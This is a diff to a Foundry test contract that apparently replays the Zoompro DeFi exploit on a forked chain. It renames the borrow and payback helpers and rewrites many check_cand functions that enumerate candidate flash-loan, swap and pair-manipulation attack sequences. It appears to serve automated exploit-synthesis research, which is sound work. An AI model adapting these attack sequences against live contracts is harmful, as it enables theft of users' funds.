@@ -106,11 +106,8 @@ contract ZoomproTest is Test, BlockLoader {
         usdt.transfer(address(trader), balanceOfusdttrader);
         zoom.transfer(address(trader), balanceOfzoomtrader);
         fusdt.transfer(address(trader), balanceOffusdttrader);
-        usdt.approve(attacker, UINT256_MAX);
         zoom.transfer(address(attackContract), balanceOfzoomattacker);
-        zoom.approve(attacker, UINT256_MAX);
         fusdt.transfer(address(attackContract), balanceOffusdtattacker);
-        fusdt.approve(attacker, UINT256_MAX);
         zoom.transfer(address(trader), 500000000000e18);
         fusdt.transfer(address(trader), 1000000e18);
         usdt.transfer(address(trader), 2000000e18);
@@ -249,28 +246,70 @@ contract ZoomproTest is Test, BlockLoader {
         return;
     }
 
-    function borrow_usdt(uint256 amount) internal {
-        usdt.transferFrom(owner, attacker, amount);
+    function borrow_owner_usdt(uint256 amount) internal {
+        vm.stopPrank();
+        vm.prank(owner);
+        usdt.transfer(attacker, amount);
+        vm.startPrank(attacker);
     }
 
-    function payback_usdt(uint256 amount) internal {
+    function payback_owner_usdt(uint256 amount) internal {
         usdt.transfer(owner, amount);
     }
 
-    function borrow_zoom(uint256 amount) internal {
-        zoom.transferFrom(owner, attacker, amount);
+    function borrow_owner_zoom(uint256 amount) internal {
+        vm.stopPrank();
+        vm.prank(owner);
+        zoom.transfer(attacker, amount);
+        vm.startPrank(attacker);
     }
 
-    function payback_zoom(uint256 amount) internal {
+    function payback_owner_zoom(uint256 amount) internal {
         zoom.transfer(owner, amount);
     }
 
-    function borrow_fusdt(uint256 amount) internal {
-        fusdt.transferFrom(owner, attacker, amount);
+    function borrow_owner_fusdt(uint256 amount) internal {
+        vm.stopPrank();
+        vm.prank(owner);
+        fusdt.transfer(attacker, amount);
+        vm.startPrank(attacker);
     }
 
-    function payback_fusdt(uint256 amount) internal {
+    function payback_owner_fusdt(uint256 amount) internal {
         fusdt.transfer(owner, amount);
+    }
+
+    function borrow_trader_usdt(uint256 amount) internal {
+        vm.stopPrank();
+        vm.prank(address(trader));
+        usdt.transfer(attacker, amount);
+        vm.startPrank(attacker);
+    }
+
+    function payback_trader_usdt(uint256 amount) internal {
+        usdt.transfer(address(trader), amount);
+    }
+
+    function borrow_trader_zoom(uint256 amount) internal {
+        vm.stopPrank();
+        vm.prank(address(trader));
+        zoom.transfer(attacker, amount);
+        vm.startPrank(attacker);
+    }
+
+    function payback_trader_zoom(uint256 amount) internal {
+        zoom.transfer(address(trader), amount);
+    }
+
+    function borrow_trader_fusdt(uint256 amount) internal {
+        vm.stopPrank();
+        vm.prank(address(trader));
+        fusdt.transfer(attacker, amount);
+        vm.startPrank(attacker);
+    }
+
+    function payback_trader_fusdt(uint256 amount) internal {
+        fusdt.transfer(address(trader), amount);
     }
 
     function swap_pair_fusdt_zoom(uint256 amount) internal {
@@ -325,7 +364,7 @@ contract ZoomproTest is Test, BlockLoader {
 
     function test_gt() public {
         vm.startPrank(attacker);
-        borrow_usdt(3000000e18);
+        borrow_owner_usdt(3000000e18);
         printBalance("After step0 ");
         swap_trader_usdt_zoom(usdt.balanceOf(attacker));
         printBalance("After step1 ");
@@ -335,7 +374,7 @@ contract ZoomproTest is Test, BlockLoader {
         printBalance("After step3 ");
         swap_trader_zoom_usdt(zoom.balanceOf(attacker));
         printBalance("After step4 ");
-        payback_usdt((3000000e18 * 1003) / 1000);
+        payback_owner_usdt((3000000e18 * 1003) / 1000);
         printBalance("After step5 ");
         require(attackGoal(), "Attack failed!");
         vm.stopPrank();
@@ -349,268 +388,160 @@ contract ZoomproTest is Test, BlockLoader {
     ) public {
         vm.startPrank(attacker);
         vm.assume(amt3 == (amt0 * 1003) / 1000);
-        borrow_usdt(amt0);
+        borrow_owner_usdt(amt0);
         swap_trader_usdt_zoom(amt1);
         breaklr_pair_controller();
         sync_pair();
         swap_trader_zoom_usdt(amt2);
-        payback_usdt(amt3);
+        payback_owner_usdt(amt3);
         assert(!attackGoal());
         vm.stopPrank();
     }
 
-    function check_cand000(
-        uint256 amt0,
-        uint256 amt1,
-        uint256 amt2,
-        uint256 amt3
-    ) public {
+    function check_cand000(uint256 amt0, uint256 amt1) public {
         vm.startPrank(attacker);
-        vm.assume(amt3 == (amt0 * 1003) / 1000);
-        borrow_usdt(amt0);
-        swap_trader_usdt_zoom(amt1);
+        vm.assume(amt1 == (amt0 * 1003) / 1000);
+        borrow_owner_usdt(amt0);
         breaklr_pair_controller();
-        swap_trader_zoom_usdt(amt2);
-        payback_usdt(amt3);
+        payback_owner_usdt(amt1);
         assert(!attackGoal());
         vm.stopPrank();
     }
 
-    function check_cand001(
-        uint256 amt0,
-        uint256 amt1,
-        uint256 amt2,
-        uint256 amt3
-    ) public {
+    function check_cand001(uint256 amt0, uint256 amt1) public {
         vm.startPrank(attacker);
-        vm.assume(amt3 == (amt0 * 1003) / 1000);
-        borrow_zoom(amt0);
-        swap_pair_zoom_fusdt(amt1);
+        vm.assume(amt1 == (amt0 * 1003) / 1000);
+        borrow_owner_zoom(amt0);
         breaklr_pair_controller();
-        swap_pair_fusdt_zoom(amt2);
-        payback_zoom(amt3);
+        payback_owner_zoom(amt1);
         assert(!attackGoal());
         vm.stopPrank();
     }
 
-    function check_cand002(
-        uint256 amt0,
-        uint256 amt1,
-        uint256 amt2,
-        uint256 amt3
-    ) public {
+    function check_cand002(uint256 amt0, uint256 amt1) public {
         vm.startPrank(attacker);
-        vm.assume(amt3 == (amt0 * 1003) / 1000);
-        borrow_zoom(amt0);
+        vm.assume(amt1 == (amt0 * 1003) / 1000);
+        borrow_owner_fusdt(amt0);
+        breaklr_pair_controller();
+        payback_owner_fusdt(amt1);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand003(uint256 amt0, uint256 amt1) public {
+        vm.startPrank(attacker);
+        vm.assume(amt1 == (amt0 * 1003) / 1000);
+        borrow_trader_usdt(amt0);
+        breaklr_pair_controller();
+        payback_trader_usdt(amt1);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand004(uint256 amt0, uint256 amt1) public {
+        vm.startPrank(attacker);
+        vm.assume(amt1 == (amt0 * 1003) / 1000);
+        borrow_trader_zoom(amt0);
+        breaklr_pair_controller();
+        payback_trader_zoom(amt1);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand005(uint256 amt0, uint256 amt1) public {
+        vm.startPrank(attacker);
+        vm.assume(amt1 == (amt0 * 1003) / 1000);
+        borrow_trader_fusdt(amt0);
+        breaklr_pair_controller();
+        payback_trader_fusdt(amt1);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand006(uint256 amt0, uint256 amt1) public {
+        vm.startPrank(attacker);
+        vm.assume(amt1 == (amt0 * 1003) / 1000);
+        borrow_owner_usdt(amt0);
+        breaklr_pair_controller();
+        sync_pair();
+        payback_owner_usdt(amt1);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand007(uint256 amt0, uint256 amt1) public {
+        vm.startPrank(attacker);
+        vm.assume(amt1 == (amt0 * 1003) / 1000);
+        borrow_owner_zoom(amt0);
+        breaklr_pair_controller();
+        sync_pair();
+        payback_owner_zoom(amt1);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand008(uint256 amt0, uint256 amt1, uint256 amt2) public {
+        vm.startPrank(attacker);
+        vm.assume(amt2 == (amt0 * 1003) / 1000);
+        borrow_owner_zoom(amt0);
+        breaklr_pair_controller();
         swap_trader_zoom_usdt(amt1);
-        breaklr_pair_controller();
-        swap_trader_usdt_zoom(amt2);
-        payback_zoom(amt3);
+        payback_owner_zoom(amt2);
         assert(!attackGoal());
         vm.stopPrank();
     }
 
-    function check_cand003(
-        uint256 amt0,
-        uint256 amt1,
-        uint256 amt2,
-        uint256 amt3
-    ) public {
+    function check_cand009(uint256 amt0, uint256 amt1) public {
         vm.startPrank(attacker);
-        vm.assume(amt3 == (amt0 * 1003) / 1000);
-        borrow_fusdt(amt0);
-        swap_pair_fusdt_zoom(amt1);
-        breaklr_pair_controller();
-        swap_pair_zoom_fusdt(amt2);
-        payback_fusdt(amt3);
-        assert(!attackGoal());
-        vm.stopPrank();
-    }
-
-    function check_cand004(
-        uint256 amt0,
-        uint256 amt1,
-        uint256 amt2,
-        uint256 amt3
-    ) public {
-        vm.startPrank(attacker);
-        vm.assume(amt3 == (amt0 * 1003) / 1000);
-        borrow_usdt(amt0);
-        swap_trader_usdt_zoom(amt1);
+        vm.assume(amt1 == (amt0 * 1003) / 1000);
+        borrow_owner_fusdt(amt0);
         breaklr_pair_controller();
         sync_pair();
-        swap_trader_zoom_usdt(amt2);
-        payback_usdt(amt3);
+        payback_owner_fusdt(amt1);
         assert(!attackGoal());
         vm.stopPrank();
     }
 
-    function check_cand005(
-        uint256 amt0,
-        uint256 amt1,
-        uint256 amt2,
-        uint256 amt3,
-        uint256 amt4
-    ) public {
+    function check_cand010(uint256 amt0, uint256 amt1) public {
         vm.startPrank(attacker);
-        vm.assume(amt4 == (amt0 * 1003) / 1000);
-        borrow_usdt(amt0);
-        swap_trader_usdt_zoom(amt1);
-        breaklr_pair_controller();
-        swap_trader_zoom_usdt(amt2);
-        swap_trader_zoom_usdt(amt3);
-        payback_usdt(amt4);
-        assert(!attackGoal());
-        vm.stopPrank();
-    }
-
-    function check_cand006(
-        uint256 amt0,
-        uint256 amt1,
-        uint256 amt2,
-        uint256 amt3
-    ) public {
-        vm.startPrank(attacker);
-        vm.assume(amt3 == (amt0 * 1003) / 1000);
-        borrow_zoom(amt0);
-        swap_pair_zoom_fusdt(amt1);
+        vm.assume(amt1 == (amt0 * 1003) / 1000);
+        borrow_trader_usdt(amt0);
         breaklr_pair_controller();
         sync_pair();
-        swap_pair_fusdt_zoom(amt2);
-        payback_zoom(amt3);
+        payback_trader_usdt(amt1);
         assert(!attackGoal());
         vm.stopPrank();
     }
 
-    function check_cand007(
-        uint256 amt0,
-        uint256 amt1,
-        uint256 amt2,
-        uint256 amt3,
-        uint256 amt4
-    ) public {
+    function check_cand011(uint256 amt0, uint256 amt1) public {
         vm.startPrank(attacker);
-        vm.assume(amt4 == (amt0 * 1003) / 1000);
-        borrow_zoom(amt0);
-        swap_pair_zoom_fusdt(amt1);
+        vm.assume(amt1 == (amt0 * 1003) / 1000);
+        borrow_trader_zoom(amt0);
         breaklr_pair_controller();
-        swap_pair_fusdt_zoom(amt2);
-        swap_trader_zoom_usdt(amt3);
-        payback_zoom(amt4);
+        sync_pair();
+        payback_trader_zoom(amt1);
         assert(!attackGoal());
         vm.stopPrank();
     }
 
-    function check_cand008(
-        uint256 amt0,
-        uint256 amt1,
-        uint256 amt2,
-        uint256 amt3
-    ) public {
+    function check_cand012(uint256 amt0, uint256 amt1, uint256 amt2) public {
         vm.startPrank(attacker);
-        vm.assume(amt3 == (amt0 * 1003) / 1000);
-        borrow_zoom(amt0);
+        vm.assume(amt2 == (amt0 * 1003) / 1000);
+        borrow_trader_zoom(amt0);
+        breaklr_pair_controller();
         swap_trader_zoom_usdt(amt1);
+        payback_trader_zoom(amt2);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand013(uint256 amt0, uint256 amt1) public {
+        vm.startPrank(attacker);
+        vm.assume(amt1 == (amt0 * 1003) / 1000);
+        borrow_trader_fusdt(amt0);
         breaklr_pair_controller();
         sync_pair();
-        swap_trader_usdt_zoom(amt2);
-        payback_zoom(amt3);
-        assert(!attackGoal());
-        vm.stopPrank();
-    }
-
-    function check_cand009(
-        uint256 amt0,
-        uint256 amt1,
-        uint256 amt2,
-        uint256 amt3,
-        uint256 amt4
-    ) public {
-        vm.startPrank(attacker);
-        vm.assume(amt4 == (amt0 * 1003) / 1000);
-        borrow_zoom(amt0);
-        swap_trader_zoom_usdt(amt1);
-        breaklr_pair_controller();
-        swap_trader_usdt_zoom(amt2);
-        swap_trader_zoom_usdt(amt3);
-        payback_zoom(amt4);
-        assert(!attackGoal());
-        vm.stopPrank();
-    }
-
-    function check_cand010(
-        uint256 amt0,
-        uint256 amt1,
-        uint256 amt2,
-        uint256 amt3
-    ) public {
-        vm.startPrank(attacker);
-        vm.assume(amt3 == (amt0 * 1003) / 1000);
-        borrow_fusdt(amt0);
-        swap_pair_fusdt_zoom(amt1);
-        breaklr_pair_controller();
-        sync_pair();
-        swap_pair_zoom_fusdt(amt2);
-        payback_fusdt(amt3);
-        assert(!attackGoal());
-        vm.stopPrank();
-    }
-
-    function check_cand011(
-        uint256 amt0,
-        uint256 amt1,
-        uint256 amt2,
-        uint256 amt3,
-        uint256 amt4
-    ) public {
-        vm.startPrank(attacker);
-        vm.assume(amt4 == (amt0 * 1003) / 1000);
-        borrow_fusdt(amt0);
-        swap_pair_fusdt_zoom(amt1);
-        breaklr_pair_controller();
-        swap_pair_zoom_fusdt(amt2);
-        swap_trader_zoom_usdt(amt3);
-        payback_fusdt(amt4);
-        assert(!attackGoal());
-        vm.stopPrank();
-    }
-
-    function check_cand012(
-        uint256 amt0,
-        uint256 amt1,
-        uint256 amt2,
-        uint256 amt3,
-        uint256 amt4
-    ) public {
-        vm.startPrank(attacker);
-        vm.assume(amt4 == (amt0 * 1003) / 1000);
-        borrow_usdt(amt0);
-        swap_trader_usdt_zoom(amt1);
-        breaklr_pair_controller();
-        sync_pair();
-        swap_trader_zoom_usdt(amt2);
-        swap_trader_zoom_usdt(amt3);
-        payback_usdt(amt4);
-        assert(!attackGoal());
-        vm.stopPrank();
-    }
-
-    function check_cand013(
-        uint256 amt0,
-        uint256 amt1,
-        uint256 amt2,
-        uint256 amt3,
-        uint256 amt4
-    ) public {
-        vm.startPrank(attacker);
-        vm.assume(amt4 == (amt0 * 1003) / 1000);
-        borrow_zoom(amt0);
-        swap_pair_zoom_fusdt(amt1);
-        breaklr_pair_controller();
-        sync_pair();
-        swap_pair_fusdt_zoom(amt2);
-        swap_trader_zoom_usdt(amt3);
-        payback_zoom(amt4);
+        payback_trader_fusdt(amt1);
         assert(!attackGoal());
         vm.stopPrank();
     }
@@ -619,38 +550,210 @@ contract ZoomproTest is Test, BlockLoader {
         uint256 amt0,
         uint256 amt1,
         uint256 amt2,
-        uint256 amt3,
-        uint256 amt4
+        uint256 amt3
     ) public {
         vm.startPrank(attacker);
-        vm.assume(amt4 == (amt0 * 1003) / 1000);
-        borrow_zoom(amt0);
-        swap_trader_zoom_usdt(amt1);
+        vm.assume(amt3 == (amt0 * 1003) / 1000);
+        borrow_owner_usdt(amt0);
+        swap_trader_usdt_zoom(amt1);
         breaklr_pair_controller();
-        sync_pair();
-        swap_trader_usdt_zoom(amt2);
-        swap_trader_zoom_usdt(amt3);
-        payback_zoom(amt4);
+        swap_trader_zoom_usdt(amt2);
+        payback_owner_usdt(amt3);
         assert(!attackGoal());
         vm.stopPrank();
     }
 
-    function check_cand015(
+    function check_cand015(uint256 amt0, uint256 amt1, uint256 amt2) public {
+        vm.startPrank(attacker);
+        vm.assume(amt2 == (amt0 * 1003) / 1000);
+        borrow_owner_zoom(amt0);
+        breaklr_pair_controller();
+        sync_pair();
+        swap_trader_zoom_usdt(amt1);
+        payback_owner_zoom(amt2);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand016(
         uint256 amt0,
         uint256 amt1,
         uint256 amt2,
-        uint256 amt3,
-        uint256 amt4
+        uint256 amt3
     ) public {
         vm.startPrank(attacker);
-        vm.assume(amt4 == (amt0 * 1003) / 1000);
-        borrow_fusdt(amt0);
+        vm.assume(amt3 == (amt0 * 1003) / 1000);
+        borrow_owner_zoom(amt0);
+        breaklr_pair_controller();
+        swap_trader_zoom_usdt(amt1);
+        swap_trader_zoom_usdt(amt2);
+        payback_owner_zoom(amt3);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand017(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt3 == (amt0 * 1003) / 1000);
+        borrow_owner_zoom(amt0);
+        swap_pair_zoom_fusdt(amt1);
+        breaklr_pair_controller();
+        swap_pair_fusdt_zoom(amt2);
+        payback_owner_zoom(amt3);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand018(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt3 == (amt0 * 1003) / 1000);
+        borrow_owner_zoom(amt0);
+        swap_trader_zoom_usdt(amt1);
+        breaklr_pair_controller();
+        swap_trader_usdt_zoom(amt2);
+        payback_owner_zoom(amt3);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand019(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt3 == (amt0 * 1003) / 1000);
+        borrow_owner_fusdt(amt0);
         swap_pair_fusdt_zoom(amt1);
         breaklr_pair_controller();
-        sync_pair();
         swap_pair_zoom_fusdt(amt2);
-        swap_trader_zoom_usdt(amt3);
-        payback_fusdt(amt4);
+        payback_owner_fusdt(amt3);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand020(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt3 == (amt0 * 1003) / 1000);
+        borrow_trader_usdt(amt0);
+        swap_trader_usdt_zoom(amt1);
+        breaklr_pair_controller();
+        swap_trader_zoom_usdt(amt2);
+        payback_trader_usdt(amt3);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand021(uint256 amt0, uint256 amt1, uint256 amt2) public {
+        vm.startPrank(attacker);
+        vm.assume(amt2 == (amt0 * 1003) / 1000);
+        borrow_trader_zoom(amt0);
+        breaklr_pair_controller();
+        sync_pair();
+        swap_trader_zoom_usdt(amt1);
+        payback_trader_zoom(amt2);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand022(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt3 == (amt0 * 1003) / 1000);
+        borrow_trader_zoom(amt0);
+        breaklr_pair_controller();
+        swap_trader_zoom_usdt(amt1);
+        swap_trader_zoom_usdt(amt2);
+        payback_trader_zoom(amt3);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand023(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt3 == (amt0 * 1003) / 1000);
+        borrow_trader_zoom(amt0);
+        swap_pair_zoom_fusdt(amt1);
+        breaklr_pair_controller();
+        swap_pair_fusdt_zoom(amt2);
+        payback_trader_zoom(amt3);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand024(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt3 == (amt0 * 1003) / 1000);
+        borrow_trader_zoom(amt0);
+        swap_trader_zoom_usdt(amt1);
+        breaklr_pair_controller();
+        swap_trader_usdt_zoom(amt2);
+        payback_trader_zoom(amt3);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand025(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt3 == (amt0 * 1003) / 1000);
+        borrow_trader_fusdt(amt0);
+        swap_pair_fusdt_zoom(amt1);
+        breaklr_pair_controller();
+        swap_pair_zoom_fusdt(amt2);
+        payback_trader_fusdt(amt3);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand026(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt3 == (amt0 * 1003) / 1000);
+        borrow_owner_usdt(amt0);
+        swap_trader_usdt_zoom(amt1);
+        breaklr_pair_controller();
+        sync_pair();
+        swap_trader_zoom_usdt(amt2);
+        payback_owner_usdt(amt3);
         assert(!attackGoal());
         vm.stopPrank();
     }
